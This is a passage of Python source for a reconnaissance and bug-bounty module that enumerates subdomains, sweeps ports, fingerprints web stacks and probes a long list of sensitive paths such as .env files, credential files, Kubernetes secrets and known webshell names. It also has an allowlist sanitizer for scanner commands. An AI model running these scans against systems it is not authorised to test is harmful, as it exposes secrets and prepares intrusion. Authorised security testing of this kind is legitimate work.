    "/vnc.html", "/websockify", "/webdav", "/dav", "/printers",
    # Extend to ~370
    "/wp-content/uploads/", "/wp-content/debug.log", "/.maintenance",
    "/INSTALL.md", "/README.md", "/CHANGELOG.md", "/TODO.md", "/LICENSE.txt",
    "/deploy", "/deploy.php", "/deploy.sh", "/deploy_prod.sh", "/setup.sh",
    "/install.sh", "/update.sh", "/backup.sh", "/migrate", "/migration",
    "/php-shell.php", "/c99.php", "/shell.php", "/cmd.php", "/cmd",
    "/wso.php", "/webshell", "/shell", "/cmd.php?cmd=id", "/backdoor",
    "/eval", "/.env.old", "/.env.backup", "/.env.prod", "/.env.dev",
    "/_debugbar", "/telescope", "/_profiler", "/_wdt",
    "/boaform/admin/formLogin", "/login.cgi", "/home.cgi", "/index.cgi",
    "/doc/", "/docs/", "/documentation", "/manual", "/manuals",
    "/owa/auth/logon.aspx", "/ecp/default.aspx", "/Microsoft-Server-ActiveSync",
    "/Rpc", "/CertEnroll", "/ads", "/CDA", "/adfs/ls/idpinitiatedsignon.htm",
    "/.npmrc", "/.yarnrc", "/.pypirc", "/netrc", "/_netrc", "/.pgpass",
    "/kibana", "/kibana/app/home", "/elasticsearch", "/_cluster/health",
    "/_cat/indices", "/_nodes", "/_search", "/_plugin/head",
    "/rabbitmq", "/api/queues", "/management", "/admin/queues",
    "/redis-commander", "/0x03/static/index.html", "/redisweb",
    "/minio", "/minio/login", "/webdav/", "/nextcloud", "/owncloud",
    "/drupal", "/user/login", "/node", "/node/info", "/node/login",
    "/phpldapadmin", "/ldapadmin", "/cockpit", "/cockpit-creds",
    "/portainer", "/api/endpoints", "/api/version", "/api/system",
    "/traefik", "/traefik/dashboard", "/api/overview", "/dashboard/api/overview",
    "/cassandramgr", "/_pahappa", "/loki", "/prometheus/graph", "/alertmanager",
    "/grafana", "/grafana/login", "/grafana/api/datasources",
    "/nagios", "/nagios3", "/centreon", "/zabbix", "/zabbix/index.php",
    "/solarwinds", "/orion", "/netdata", "/netdata/api/v1/info",
    "/cacti", "/smokeping", "/observium", "/librenms",
    "/wazuh", "/kibana/app/kibana#/home", "/opensearch", "/graylog",
    "/dashboard", "/app/kibana", "/_plugin/bigdesk", "/_plugin/head",
    "/head", "/bigdesk", "/kopf", "/hq", "/es_admin",
    "/.gitignore", "/LICENSE", "/Makefile", "/Pipfile", "/Pipfile.lock",
    "/poetry.lock", "/pyproject.toml", "/setup.py", "/setup.cfg", "/tox.ini",
    "/phpunit.xml", "/phpunit.xml.bak", "/composer.phar",
    "/wp-includes/", "/wp-includes/js/jquery/jquery.js",
    "/administrator/index.php", "/joomla/administrator",
    "/mediawiki/index.php", "/wiki", "/tiki-index.php",
    "/roundcube", "/roundcubemail", "/squirrelmail", "/horde", "/webmail2",
    "/moodle", "/moodle/login/index.php", "/moodle/admin",
    "/magento", "/magento/admin", "/shopware", "/prestashop", "/prestashop/admin",
    "/oscommerce", "/opencart", "/admin/index.php", "/typo3", "/typo3/index.php",
    "/confluence", "/jira", "/bamboo", "/bitbucket", "/bitbucket/scm",
    "/gitlab", "/gitlab/users/sign_in", "/github", "/gitea", "/gogs", "/user/login",
    "/argocd", "/argocd/login", "/argocd/api/v1/session",
    "/harbor", "/harbor/sign-in", "/v2/", "/chartrepo", "/api/projects",
    "/rancher", "/rancher/login", "/dashboard/login", "/v1-public/auth-modes",
    "/longhorn", "/dashboard/#/auth/login", "/k8s/clusters",
    "/api/v1/namespaces", "/api/v1/pods", "/api/v1/secrets",
    "/ui", "/k8s/ui", "/dashboard/", "/kubernetes-dashboard",
    "/api/v1/configmaps", "/api/v1/services", "/api/v1/nodes",
    "/caddy/metrics", "/nginx_status", "/apache_status", "/server-status?auto",
    "/.well-known/", "/crossdomain.xml.bak", "/favicon.ico.bak",
]
# de-dupe
DEEP_WEB_PATHS = list(dict.fromkeys(DEEP_WEB_PATHS))


TECH_RX = [
    (r"WordPress", "wp-|/wp-content/|/wp-includes/|wp-json|<meta name=[\"']generator[\"'] content=[\"']WordPress"),
    (r"Drupal", "drupal|drupalSettings|sites/default/files"),
    (r"Joomla", "/media/jui/|/administrator/|<meta name=\"generator\" content=\"Joomla"),
    (r"Magento", "magento|/static/frontend/|X-Magento"),
    (r"Laravel", "laravel_session|XSRF-TOKEN|Illuminate|laravel"),
    (r"Symfony", "symfony|_profiler|_wdt"),
    (r"Django", "csrftoken|django|__admin__|wsgi"),
    (r"Flask", "werkzeug|flask|Set-Cookie: session="),
    (r"Express", "express|X-Powered-By: Express"),
    (r"Next.js", "__next|/_next/static|Next.js"),
    (r"React", "react|reactroot|__reactFiber"),
    (r"Vue", "__vue|vue.runtime|vue.min|data-v-"),
    (r"Angular", "ng-version|angular|@angular"),
    (r"Nginx", "Server: nginx|nginx/"),
    (r"Apache", "Server: Apache|apache/"),
    (r"IIS", "Server: Microsoft-IIS|X-Powered-By: ASP.NET"),
    (r"Cloudflare", "cloudflare|__cfduid|cf-ray"),
    (r"PHP", "X-Powered-By: PHP|php/|PHPSESSID"),
    (r"Tomcat", "Apache-Coyote|Tomcat|/manager/html|JSESSIONID"),
    (r"Jenkins", "X-Jenkins|jenkins|/jenkins/"),
    (r"Grafana", "grafana|/grafana/|GF_"),
    (r"Kibana", "kbn-name|kibana|/kibana/"),
    (r"Elasticsearch", "elasticsearch|\"cluster_name\""),
    (r"Redis", "redis_version|redis"),
    (r"phpMyAdmin", "pma_|phpmyadmin|/phpmyadmin/"),
    (r"GitLab", "gitlab|_gitlab_session"),
    (r"Gitea", "gitea|/gitea/"),
]


def _tool_version(cmd: list[str]) -> str | None:
    if not shutil.which(cmd[0]):
        return None
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
        out = (r.stdout or r.stderr).splitlines()
        return (out[0].strip()[:100] if out else "installed")
    except Exception:
        return "installed"


TOOLS = [
    ("nmap",        ["nmap", "--version"],            "apt-get install -y nmap"),
    ("masscan",     ["masscan", "--version"],         "apt-get install -y masscan"),
    ("subfinder",   ["subfinder", "-h"],              "go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"),
    ("assetfinder", ["assetfinder", "-h"],            "go install -v github.com/tomnomnom/assetfinder@latest"),
    ("amass",       ["amass", "version"],             "apt-get install -y amass"),
    ("httpx",       ["httpx", "-version"],            "go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest"),
    ("ffuf",        ["ffuf", "-V"],                   "go install -v github.com/ffuf/ffuf/v2@latest"),
    ("gobuster",    ["gobuster", "version"],          "apt-get install -y gobuster"),
    ("dirsearch",   ["dirsearch", "-h"],              "apt-get install -y dirsearch"),
    ("nikto",       ["nikto", "-Version"],            "apt-get install -y nikto"),
    ("sqlmap",      ["sqlmap", "--version"],          "apt-get install -y sqlmap"),
    ("hydra",       ["hydra", "-h"],                  "apt-get install -y hydra"),
    ("hashcat",     ["hashcat", "--version"],         "apt-get install -y hashcat"),
    ("aircrack-ng", ["aircrack-ng", "--help"],        "apt-get install -y aircrack-ng"),
    ("wireshark",   ["tshark", "--version"],          "apt-get install -y tshark"),
    ("tcpdump",     ["tcpdump", "--version"],         "apt-get install -y tcpdump"),
    ("iw",          ["iw", "--version"],              "apt-get install -y iw"),
    ("airmon-ng",   ["airmon-ng"],                    "apt-get install -y aircrack-ng"),
    ("hcxtools",    ["hcxpcapngtool", "-h"],          "apt-get install -y hcxtools"),
    ("whois",       ["whois", "--version"],           "apt-get install -y whois"),
    ("nuclei",      ["nuclei", "-version"],           "go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"),
    ("katana",      ["katana", "-version"],           "go install -v github.com/projectdiscovery/katana/cmd/katana@latest"),
    ("dig",         ["dig", "-v"],                    "apt-get install -y dnsutils"),
    ("curl",        ["curl", "--version"],            "apt-get install -y curl"),
    ("jq",          ["jq", "--version"],              "apt-get install -y jq"),
]


def get_tools_status(force_refresh: bool = False) -> dict:
    global TOOLS_STATUS_CACHE
    now = time.time()
    if not force_refresh and (now - TOOLS_STATUS_CACHE["checked_at"]) < TOOL_CHECK_TTL and TOOLS_STATUS_CACHE["tools"]:
        return TOOLS_STATUS_CACHE["tools"]
    out = {}
    for name, cmd, install_hint in TOOLS:
        path = shutil.which(cmd[0])
        v = None
        if path:
            v = _tool_version(cmd)
        out[name] = {"installed": bool(path), "path": path or "", "version": v or "",
                     "install_hint": install_hint}
    TOOLS_STATUS_CACHE = {"checked_at": now, "tools": out}
    return out


def install_tool(name: str) -> tuple[bool, str]:
    # Only support apt-based install hints; only run if apt exists.
    by_name = {n: (c, h) for n, c, h in TOOLS}
    if name not in by_name:
        return False, f"Unknown tool: {name}"
    hint = by_name[name][1]
    if hint.startswith("apt-get"):
        if not shutil.which("apt-get"):
            return False, "apt-get not available (need Debian/Ubuntu host)"
        if os.geteuid() != 0:
            return False, "Need root/sudo to install packages"
        try:
            r = subprocess.run(hint.split(), capture_output=True, text=True, timeout=600)
            if r.returncode != 0:
                return False, (r.stderr or r.stdout)[:600]
            get_tools_status(force_refresh=True)
            return True, f"{name} installed"
        except Exception as e:
            return False, str(e)
    if hint.startswith("go install"):
        if not shutil.which("go"):
            return False, "go not installed; cannot install go-based tool"
        try:
            env = os.environ.copy()
            gopath = env.get("GOPATH", os.path.expanduser("~/go"))
            env["PATH"] = f"{gopath}/bin:" + env.get("PATH", "")
            r = subprocess.run(hint.split(), capture_output=True, text=True, timeout=600, env=env)
            if r.returncode != 0:
                return False, (r.stderr or r.stdout)[:600]
            get_tools_status(force_refresh=True)
            return True, f"{name} installed via go"
        except Exception as e:
            return False, str(e)
    return False, f"Install hint not supported automatically: {hint}"


def _safe_host(target: str) -> str:
    t = target.strip().lower()
    t = t.replace("http://","").replace("https://","").split("/")[0].split(":")[0]
    return t


def _resolve(host: str) -> list[str]:
    ips = set()
    try:
        for res in socket.getaddrinfo(host, None):
            ip = res[4][0]
            try:
                ipaddress.ip_address(ip)
                ips.add(ip)
            except Exception:
                pass
    except Exception:
        pass
    return sorted(ips)


def _enumerate_subdomains(domain: str, sources=("crtsh","wordlist","dns")) -> list[dict]:
    found: dict[str, set] = defaultdict(set)

    def add(name: str, source: str):
        name = name.lower().strip(".")
        if not name:
            return
        if not name.endswith(domain) and name != domain:
            return
        found[name].add(source)

    add(domain, "seed")

    # 1) crt.sh
    if "crtsh" in sources and REQUESTS_AVAILABLE:
        try:
            r = requests.get(f"https://crt.sh/?q=%25.{domain}&output=json", timeout=10)
            if r.ok:
                data = r.json()
                for entry in data:
                    for n in str(entry.get("name_value","")).splitlines():
                        for nm in n.split("*"):
                            nm = nm.strip(". ")
                            if nm:
                                add(nm, "crt.sh")
        except Exception as e:
            print(f"[!] crt.sh failed: {e}")

    # 2) Wordlist brute (tiny ~80 unless configured)
    wl_key = get_setting("bb_wordlist", "common")
    WORDLISTS = {
        "tiny":   ("www,mail,ftp,localhost,webmail,smtp,pop,ns1,we,ns2,api,admin,dev,staging,test,app,blog,shop,cloud,vpn,git,ci,cdn,portal,mail2,ns3,direct,dns,home,host,hosting,imap,info,jobs,kb,lists,news,old,remote,search,server,shop,site,support,video,web").split(","),
        "common": ("www,mail,ftp,webmail,smtp,pop,ns1,ns2,ns3,api,admin,dev,staging,test,app,blog,shop,m,cdn,cloud,vpn,git,ci,portal,direct,dns,home,host,imap,jobs,news,search,server,support,video,new,old,mobile,api2,admin2,dev2,test2,secure,devtools,console,app2,backend,frontend,static,media,images,img,cache,email,exchange,autodiscover,owa,sso,auth,login,account,accounts,id,saml,sso2,adfs,fs,okta,jenkins,gitlab,gitea,artifactory,npm,pypi,docker,registry,hub,k8s,kubernetes,rancher,argocd,grafana,kibana,elastic,prom,monitor,prometheus,alerts,logs,metrics,db,database,mysql,postgres,redis,mongo,rabbitmq,queue,worker,celery,sentry,sandbox,preview,demo,temp,uat,qa,stage,prod,internal,intra,lan").split(","),
    }
    wl = WORDLISTS.get(wl_key, WORDLISTS["common"])

    def probe(sub: str):
        h = f"{sub}.{domain}"
        if _resolve(h):
            add(h, "dictionary")

    with ThreadPoolExecutor(max_workers=20) as ex:
        list(ex.map(probe, wl))

    # 3) External tools (subfinder/assetfinder/amass)
    if REQUESTS_AVAILABLE:
        for tool, args in [("subfinder", ["subfinder","-silent","-d",domain]),
                           ("assetfinder", ["assetfinder","--subs-only",domain])]:
            if shutil.which(tool):
                try:
                    r = subprocess.run(args, capture_output=True, text=True, timeout=120)
                    for line in r.stdout.splitlines():
                        add(line.strip(), tool)
                except Exception:
                    pass
        if shutil.which("amass"):
            try:
                r = subprocess.run(["amass","enum","-passive","-d",domain,"-timeout","2"],
                                   capture_output=True, text=True, timeout=180)
                for line in r.stdout.splitlines():
                    add(line.strip(), "amass")
            except Exception:
                pass
    return [{"subdomain": k, "sources": sorted(v)} for k, v in sorted(found.items())]


def _probe_host(h: str, timeout: float = 5.0) -> dict | None:
    """HTTP/HTTPS probe - returns title/status/tech."""
    result = {"host": h, "url": "", "status_code": 0, "title": "", "tech": [], "server": "",
              "content_length": 0, "scheme": ""}
    for scheme in ("https","http"):
        url = f"{scheme}://{h}/"
        try:
            r = requests.get(url, timeout=timeout, allow_redirects=True, verify=False,
                             headers={"User-Agent":"Mozilla/5.0 Network-Analyzer"})
            text = r.text[:50000]
            m = re.search(r"<title>([^<]+)</title>", text, re.IGNORECASE)
            title = html.unescape(m.group(1).strip()) if m else ""
            tech = set()
            for name, rx in TECH_RX:
                if re.search(rx, text, re.IGNORECASE) or re.search(rx, str(r.headers), re.IGNORECASE):
                    tech.add(name)
            result.update({"url": r.url, "status_code": r.status_code, "title": title[:200],
                           "tech": sorted(tech), "server": r.headers.get("server","")[:120],
                           "content_length": len(r.content), "scheme": scheme})
            return result
        except Exception:
            continue
    return None


def _resolve_open_ports(ip: str, ports: list[int] | None = None, timeout: float = 0.5) -> list[int]:
    if ports is None:
        ports = [21,22,23,25,53,80,110,111,135,139,143,443,445,465,587,993,995,
                 1433,1521,1723,3306,3389,5432,5900,6379,8000,8009,8080,8443,8888,9000,9090,9200]
    openp = []
    lock = Lock()
    def p(p_):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(timeout)
        try:
            if s.connect_ex((ip, p_)) == 0:
                with lock: openp.append(p_)
        finally:
            s.close()
    with ThreadPoolExecutor(max_workers=40) as ex:
        list(ex.map(p, ports))
    return sorted(openp)


def _http_enrich(host: str, ports: list[int]) -> list[dict]:
    out = []
    for port in ports:
        if port in (80, 81, 3000, 5000, 8000, 8080, 8081, 8888, 9000, 9090):
            url = f"http://{host}:{port}/"
        elif port in (443, 8443, 9443, 4433):
            url = f"https://{host}:{port}/"
        else:
            continue
        try:
            r = requests.get(url, timeout=4, verify=False, allow_redirects=True,
                             headers={"User-Agent":"Mozilla/5.0 Network-Analyzer"})
            m = re.search(r"<title>([^<]+)</title>", r.text[:20000], re.IGNORECASE)
            title = html.unescape(m.group(1).strip()) if m else ""
            out.append({"port": port, "url": r.url, "status": r.status_code, "title": title[:150],
                        "server": r.headers.get("server","")[:100]})
        except Exception:
            continue
    return out


def _tls_enrich(host: str) -> dict | None:
    return grab_tls_cert(host, 443, timeout=3)


def _vt_enrich(host: str) -> dict | None:
    key = get_setting("vt_api_key") or os.environ.get("VT_API_KEY","")
    if not key or not REQUESTS_AVAILABLE:
        return None
    try:
        import hashlib as _h
        hid = _h.sha256(host.encode()).hexdigest()
        r = requests.get(f"https://www.virustotal.com/api/v3/domains/{host}",
                         headers={"x-apikey": key}, timeout=8)
        if r.ok:
            return r.json()
        return {"error": r.status_code, "detail": r.text[:200]}
    except Exception as e:
        return {"error": str(e)[:200]}


def _deep_web_scan(host: str, concurrency: int = 25, max_paths: int = 0) -> list[dict]:
    paths = DEEP_WEB_PATHS[:max_paths] if max_paths else DEEP_WEB_PATHS
    found = []
    lock = Lock()
    base_urls = [u for u in (f"https://{host}", f"http://{host}")]
    timeout = float(get_setting("bb_http_timeout", "6") or "6")

    def check(args):
        base, path = args
        url = base + (path if path.startswith("/") else "/" + path)
        try:
            r = requests.get(url, timeout=timeout, allow_redirects=False, verify=False,
                             headers={"User-Agent":"Mozilla/5.0 Network-Analyzer Recon"})
            if r.status_code in (200, 201, 204, 301, 302, 307, 308, 401, 403, 405, 407, 500, 502):
                ctype = r.headers.get("content-type","")[:80]
                server = r.headers.get("server","")[:60]
                body = r.content[:400]
                title = ""
                if "html" in ctype.lower():
                    m = re.search(rb"<title>([^<]+)</title>", body, re.IGNORECASE)
                    if m:
                        title = m.group(1).decode("utf-8","ignore").strip()[:150]
                with lock:
                    found.append({"url": url, "status": r.status_code, "length": len(r.content),
                                  "content_type": ctype, "server": server, "title": title,
                                  "interesting": r.status_code == 200 and path in ("/admin","/.env","/wp-config.php.bak",
                                                                                   "/phpmyadmin","/.git/config",
                                                                                   "/server-status","/actuator/env")})
        except Exception:
            pass

    jobs = [(b,p) for b in base_urls for p in paths]
    with ThreadPoolExecutor(max_workers=concurrency) as ex:
        for _ in ex.map(check, jobs):
            pass
    return sorted(found, key=lambda x: (-x.get("interesting",0), x["status"], x["url"]))[:400]


def start_recon_job(target: str, modes=("subdomains","ports","http","tls","deepweb")) -> str:
    job_id = f"recon_{secrets.token_hex(6)}"
    with recon_lock:
        recon_jobs[job_id] = {"job_id": job_id, "target": target, "started_at": datetime.now().isoformat(),
                              "finished_at": None, "status": "running", "phase": "starting",
                              "subdomains": [], "open_ports": {}, "http": {}, "tls": None,
                              "vt": None, "deep_web": [], "summary": "", "error": ""}

    def run():
        j = recon_jobs[job_id]
        try:
            host = _safe_host(target)
            j["phase"] = "dns"
            ips = _resolve(host)
            if not ips:
                j["error"] = "Could not resolve target"
                j["status"] = "failed"
                j["finished_at"] = datetime.now().isoformat()
                return

            # Subdomains
            if "subdomains" in modes:
                j["phase"] = "subdomains"
                try:
                    j["subdomains"] = _enumerate_subdomains(host)
                except Exception as e:
                    j["subdomains"] = [{"subdomain": host, "sources": ["seed"], "error": str(e)}]

            # Ports for each resolved IP of root
            j["phase"] = "ports"
            j["ports_unreliable"] = False
            try:
                if ips and _canary_port_check(ips[0])["canary_open"]:
                    j["ports_unreliable"] = True
            except Exception:
                pass
            all_hosts = {host} | {s["subdomain"] for s in j["subdomains"]}
            # Limit to first 30 hosts for performance
            for h in list(sorted(all_hosts))[:30]:
                h_ips = _resolve(h)
                for ip in h_ips[:3]:
                    try:
                        op = _resolve_open_ports(ip)
                        if op:
                            j["open_ports"][h] = {"ip": ip, "ports": op}
                    except Exception:
                        pass

            # HTTP/TLS for root + open-port hosts
            j["phase"] = "http"
            for h, info in list(j["open_ports"].items())[:20]:
                try:
                    j["http"][h] = _http_enrich(h, info["ports"])
                except Exception:
                    pass
            # also probe root with standard probe to get title/tech
            try:
                hp = _probe_host(host)
                if hp:
                    j["http"][host] = j["http"].get(host, []) + [{"port": 443 if hp["scheme"]=="https" else 80,
                                                                   "url": hp["url"], "status": hp["status_code"],
                                                                   "title": hp["title"], "server": hp["server"],
                                                                   "tech": hp["tech"]}]
            except Exception:
                pass

            if "tls" in modes:
                j["phase"] = "tls"
                try:
                    j["tls"] = _tls_enrich(host)
                    # persist to ssl_cert_log
                    c = j["tls"]
                    if c and "error" not in c:
                        conn = get_db()
                        conn.execute(
                            """INSERT INTO ssl_cert_log (timestamp,host,port,subject,issuer,not_before,not_after,is_self_signed,weak_cipher,days_until_expiry,san,serial,sig_algo)
                               VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)""",
                            (datetime.now().isoformat(), c.get("host"), c.get("port",443), c.get("subject",""),
                             c.get("issuer",""), c.get("not_before",""), c.get("not_after",""),
                             1 if c.get("is_self_signed") else 0,
                             str(c.get("weak_cipher",False)), c.get("days_until_expiry"),
                             json.dumps(c.get("san",[])), c.get("serial",""), c.get("sig_algo","")),
                        )
                        conn.commit(); conn.close()
                except Exception as e:
                    j["tls"] = {"error": str(e)}

            if "vt" in modes or os.environ.get("VT_API_KEY") or get_setting("vt_api_key"):
                j["phase"] = "vt"
                try:
                    j["vt"] = _vt_enrich(host)
                except Exception:
                    pass

            if "deepweb" in modes:
                j["phase"] = "deepweb"
                try:
                    j["deep_web"] = _deep_web_scan(host, concurrency=20, max_paths=250)
                except Exception as e:
                    j["deep_web"] = []
                    j["error"] = (j.get("error","") + f" deepweb:{e}").strip()

            j["status"] = "done"
            j["phase"] = "complete"
            j["finished_at"] = datetime.now().isoformat()
            total_subs = len(j["subdomains"])
            total_ports = sum(len(v["ports"]) for v in j["open_ports"].values())
            dw_int = sum(1 for f in j["deep_web"] if f.get("interesting"))
            j["summary"] = f"subdomains={total_subs} open_ports={total_ports} deep_web_hits={len(j['deep_web'])} interesting={dw_int}"
            if j.get("ports_unreliable"):
                j["summary"] += " (⚠ port sweep unreliable: transparent proxy)"
            # persist to recon_log
            try:
                conn = get_db()
                conn.execute(
                    """INSERT INTO recon_log (job_id,target,started_at,finished_at,status,phase,subdomains_json,open_ports_json,http_json,tls_json,vt_json,deep_web_json,summary,error)
                       VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)""",
                    (job_id, target, j["started_at"], j["finished_at"], j["status"], j["phase"],
                     json.dumps(j["subdomains"]), json.dumps(j["open_ports"]), json.dumps(j["http"]),
                     json.dumps(j["tls"]), json.dumps(j["vt"]), json.dumps(j["deep_web"]),
                     j["summary"], j["error"]),
                )
                conn.commit(); conn.close()
            except Exception as e:
                print(f"[!] recon persist error: {e}")
            audit("recon_complete", details=f"{target} {j['summary']}")
        except Exception as e:
            j["status"] = "failed"
            j["error"] = str(e)
            j["finished_at"] = datetime.now().isoformat()

    threading.Thread(target=run, daemon=True).start()
    return job_id


def get_recon_job(job_id: str) -> dict | None:
    with recon_lock:
        return recon_jobs.get(job_id)


def list_recent_recon(limit: int = 20) -> list[dict]:
    conn = get_db()
    rows = conn.execute("SELECT job_id,target,started_at,finished_at,status,phase,summary,error FROM recon_log ORDER BY started_at DESC LIMIT ?", (limit,)).fetchall()
    conn.close()
    return [dict(r) for r in rows]


# ============================================================
# BATCH E: BUG BOUNTY
# ============================================================
ALLOWLISTED_BB_TOOLS = {
    # name -> argv builder (args given to <name> must not contain shell metachars/flags we disallow)
    "subfinder": {"bin":"subfinder", "allow": {"-d","-silent","-all","-recursive","-timeout"}},
    "assetfinder": {"bin":"assetfinder", "allow": {"--subs-only"}},
    "amass": {"bin":"amass", "allow": {"enum","-passive","-d","-timeout"}},
    "httpx": {"bin":"httpx", "allow": {"-title","-tech-detect","-status-code","-content-length","-silent","-timeout","-follow-redirects","-no-color","-ports"}},
    "ffuf": {"bin":"ffuf", "allow": {"-u","-w","-t","-maxtime","-mc","-o","-ac"}},
    "nmap": {"bin":"nmap", "allow": {"-sV","-sT","-sC","-Pn","-p","-T4","-T3","--top-ports","-oX","-oN","--open"}},
    "nuclei": {"bin":"nuclei", "allow": {"-u","-tags","-severity","-silent","-rl","-timeout","-json","-c","-rl"}},
    "katana": {"bin":"katana", "allow": {"-u","-silent","-d","-jsonl","-jc","-kf","-c"}},
    "dig": {"bin":"dig", "allow": {"+short","@","-t"}},
    "whois": {"bin":"whois", "allow": set()},
    "curl": {"bin":"curl", "allow": {"-s","-S","-L","-I","-m","--max-time","-A","-H"}},
}


def _sanitize_bb_argv(cmd: list[str]) -> list[str]:
    """Only allow known bins and flags. Disallow shell metachars & obvious-danger args."""
    if not cmd:
        raise ValueError("empty command")
    name = cmd[0]
    if name not in ALLOWLISTED_BB_TOOLS:
        raise ValueError(f"tool not allowlisted: {name}")
    spec = ALLOWLISTED_BB_TOOLS[name]
    bad_chars = set(";&|`$<>\\\"'\n\r*?#")
    out = [spec["bin"]]
    i = 1
    while i < len(cmd):
        a = cmd[i]
        if not isinstance(a,str) or not a:
            i += 1; continue
        if any(c in bad_chars for c in a):
            raise ValueError(f"disallowed characters in argument: {a!r}")
        if a.startswith("-") and a not in spec["allow"] and not a.lstrip("-").replace(".","").isdigit():
            # allow numeric values like -p 80,443 as long as they come after a known flag
            prev = out[-1] if len(out) > 1 else ""
            if prev in spec["allow"]:
                out.append(a); i += 1; continue
            # Allow comma-separated ports after -p or --top-ports
            if prev in ("-p","--top-ports","-ports","-timeout","-t","-maxtime","-m","--max-time","-w","-o","-u","-A"):
                out.append(a); i += 1; continue
            # unknown flag: reject
            raise ValueError(f"disallowed flag: {a}")
        out.append(a)
        i += 1
    return out


def bb_run_command_stream(cmd: list[str], job_id: str, timeout: int = 180):
    """Generator that streams stdout lines and updates job log_tail."""
    try:
        safe = _sanitize_bb_argv(cmd)
    except Exception as e:
        yield f"[!] rejected: {e}\n"
        with bb_lock:
            if job_id in bb_jobs:
                bb_jobs[job_id]["error"] = str(e)
        return
    if not shutil.which(safe[0]):
        yield f"[!] missing tool: {safe[0]}\n"
        return
    try:
        proc = subprocess.Popen(safe, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                text=True, bufsize=1, preexec_fn=os.setsid if hasattr(os,"setsid") else None)
    except Exception as e:
        yield f"[!] exec error: {e}\n"
        return
    tail_buf = []
    try:
        assert proc.stdout is not None
        for line in proc.stdout:
            tail_buf.append(line)
            if len(tail_buf) > 200:
                tail_buf = tail_buf[-200:]
            with bb_lock:
                if job_id in bb_jobs:
                    bb_jobs[job_id]["log_tail"] = "".join(tail_buf)[-4000:]
            yield line
            if proc.poll() is not None:
                break
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
    except Exception as e:
        yield f"[!] run error: {e}\n"


def bb_add_target(target: str, scope: str = "*.{t}", notes: str = "") -> tuple[bool, str]:
    t = _safe_host(target)
    if not t:
        return False, "invalid target"
    scope = scope.replace("{t}", t)
    now = datetime.now().isoformat()
    user = current_user.username if current_user.is_authenticated else "system"
    conn = get_db()
    try:
        conn.execute("INSERT INTO bb_targets (target,scope,added_at,added_by,notes,active) VALUES (?,?,?,?,?,1)",
                     (t, scope, now, user, notes))
        conn.commit(); conn.close()
        audit("bb_target_add", details=f"target={t}")
        return True, t
    except sqlite3.IntegrityError:
        conn.close()
        return False, "target already exists"


def bb_list_targets() -> list[dict]:
    conn = get_db()
    rows = conn.execute("SELECT * FROM bb_targets WHERE active=1 ORDER BY added_at DESC").fetchall()
    conn.close()
    return [dict(r) for r in rows]


def bb_delete_target(target: str) -> tuple[bool, str]:
    conn = get_db()
    conn.execute("UPDATE bb_targets SET active=0 WHERE target=?", (target,))
    conn.commit(); conn.close()
    return True, "deactivated"


def bb_new_job(target: str, kind: str) -> str:
    job_id = f"bb_{secrets.token_hex(6)}"
    user = current_user.username if current_user.is_authenticated else "system"
    with bb_lock:
        bb_jobs[job_id] = {"job_id": job_id, "target": target, "kind": kind,
                           "status": "queued", "started_at": datetime.now().isoformat(),
                           "finished_at": None, "started_by": user,
                           "progress": 0, "total": 0, "findings": [], "log_tail": "", "error": ""}
    # persist job row
    conn = get_db()
    conn.execute(
        "INSERT INTO bb_jobs (job_id,target,kind,status,started_at,started_by,progress,total,findings_json,log_tail,error) VALUES (?,?,?,?,?,?,?,?,?,?,?)",
        (job_id,target,kind,"queued",datetime.now().isoformat(),user,0,0,"{}","",""),
    )
    conn.commit(); conn.close()
    return job_id


def bb_start_subdomain_enum(target: str, sources=("crtsh","wordlist","subfinder","assetfinder","amass")) -> str:
    job_id = bb_new_job(target, "subdomain-enum")

    def run():
        with bb_lock:
            bb_jobs[job_id]["status"] = "running"
        try:
            # Run in-memory enumeration
            found = _enumerate_subdomains(target, sources=sources)
            # Persist to bb_subdomains
            conn = get_db()
            n_new = 0
            for f in found:
                for src in f["sources"]:
                    try:
                        conn.execute(
                            "INSERT OR IGNORE INTO bb_subdomains (target,subdomain,source,discovered_at) VALUES (?,?,?,?)",
                            (target, f["subdomain"], src, datetime.now().isoformat()),
                        )
                        n_new += 1
                    except Exception:
                        pass
            conn.execute("UPDATE bb_jobs SET status='done',finished_at=?,progress=100,total=?,findings_json=?,log_tail=? WHERE job_id=?",
                         (datetime.now().isoformat(), len(found), json.dumps(found),
                          f"Found {len(found)} subdomains ({n_new} entries across sources)", job_id))
            conn.commit(); conn.close()
            with bb_lock:
                bb_jobs[job_id].update({"status":"done","finished_at":datetime.now().isoformat(),
                                        "progress":100,"total":len(found),"findings":found})
            audit("bb_subdomain_enum", details=f"{target} subs={len(found)}")
        except Exception as e:
            with bb_lock:
                bb_jobs[job_id].update({"status":"failed","error":str(e),"finished_at":datetime.now().isoformat()})
            conn = get_db()
            conn.execute("UPDATE bb_jobs SET status='failed',finished_at=?,error=? WHERE job_id=?",
                         (datetime.now().isoformat(), str(e), job_id))
            conn.commit(); conn.close()

    threading.Thread(target=run, daemon=True).start()
    return job_id


def bb_start_live_probe(target: str, concurrency: int = 25) -> str:
    job_id = bb_new_job(target, "live-probe")

    def run():
        with bb_lock:
            bb_jobs[job_id]["status"] = "running"
        try:
            conn = get_db()
            subs = [r["subdomain"] for r in conn.execute(
                "SELECT DISTINCT subdomain FROM bb_subdomains WHERE target=?", (target,)).fetchall()]
            conn.close()
            hosts = sorted(set([target] + subs))
            timeout = float(get_setting("bb_http_timeout", "6"))
            results = []
            total = len(hosts)
            with ThreadPoolExecutor(max_workers=concurrency) as ex:
                fut_to_h = {ex.submit(_probe_host, h, timeout=timeout): h for h in hosts}
                done = 0
                for fut in as_completed(fut_to_h):
                    done += 1
                    h = fut_to_h[fut]
                    try:
                        r = fut.result()
                    except Exception:
                        r = None
                    with bb_lock:
                        bb_jobs[job_id]["progress"] = int(done * 100 / max(1, total))
                        bb_jobs[job_id]["total"] = total
                    if r:
                        results.append(r)
                    if done % 5 == 0 or done == total:
                        conn = get_db()
                        conn.execute("UPDATE bb_jobs SET progress=?,total=? WHERE job_id=?",
                                     (int(done*100/max(1,total)), total, job_id))
                        conn.commit(); conn.close()
